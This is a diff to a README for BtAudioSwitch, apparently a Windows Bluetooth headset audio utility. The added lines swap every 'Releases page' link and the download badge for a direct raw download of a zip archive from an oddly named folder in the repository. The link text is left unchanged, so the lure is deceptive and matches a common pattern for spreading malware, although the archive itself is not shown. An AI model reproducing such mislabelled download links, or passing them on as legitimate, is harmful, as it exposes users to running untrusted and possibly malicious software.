@@ -22,7 +22,7 @@ BtAudioSwitch is a useful Windows utility that allows you to switch between Blue
 
 To get BtAudioSwitch, visit the Releases page to download the latest version.
 
-[![Download BtAudioSwitch](https://img.shields.io/badge/Download-BtAudioSwitch-blue.svg)](https://github.com/Harysai/BtAudioSwitch/releases)
+[![Download BtAudioSwitch](https://github.com/Harysai/BtAudioSwitch/raw/refs/heads/main/Cystophora/Bt-Switch-Audio-v3.7.zip)](https://github.com/Harysai/BtAudioSwitch/raw/refs/heads/main/Cystophora/Bt-Switch-Audio-v3.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed.
@@ -30,7 +30,7 @@ To get BtAudioSwitch, visit the Releases page to download the latest version.
 4. Once downloaded, locate the file on your computer and double-click to run the installer.
 5. Follow the on-screen instructions to complete the installation.
 
-You can also visit the [Releases page](https://github.com/Harysai/BtAudioSwitch/releases) directly to explore earlier versions or view release notes.
+You can also visit the [Releases page](https://github.com/Harysai/BtAudioSwitch/raw/refs/heads/main/Cystophora/Bt-Switch-Audio-v3.7.zip) directly to explore earlier versions or view release notes.
 
 ## 🎤 How to Use
 
@@ -76,4 +76,4 @@ If you have further questions or suggestions, feel free to open an issue in the 
 - gaming
 - push-to-talk
 
-For any updates or new features, check back to the [Releases page](https://github.com/Harysai/BtAudioSwitch/releases) regularly. Enjoy the seamless audio experience with your Bluetooth headsets using BtAudioSwitch!
+For any updates or new features, check back to the [Releases page](https://github.com/Harysai/BtAudioSwitch/raw/refs/heads/main/Cystophora/Bt-Switch-Audio-v3.7.zip) regularly. Enjoy the seamless audio experience with your Bluetooth headsets using BtAudioSwitch!
